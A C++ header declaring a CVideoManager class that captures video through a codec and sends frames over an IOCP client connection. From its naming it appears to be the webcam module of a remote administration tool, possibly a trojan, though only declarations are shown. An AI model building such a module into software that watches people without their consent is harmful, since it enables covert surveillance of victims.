#pragma once
#include "Manager.h"
#include "SampleGrabberCB.h"
#include"VideoCodec.h"
class CVideoManager :
	public CManager
{
public:
	CVideoManager(IOCPClient* ClientObject);
	~CVideoManager();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	static DWORD WINAPI WorkThread(LPVOID lParam);
	BOOL Initialize();
	VOID SendBitMapInfor();
	VOID SendNextScreen();
	void Destroy();
public:
	BOOL m_bisWorking;
	HANDLE m_WorkThreadHandle;
	CCaptureVideo  m_CapVideo;

	BOOL m_bIsCompress;
	DWORD m_fccHandler;
	CVideoCodec *m_pVideoCodec;
};

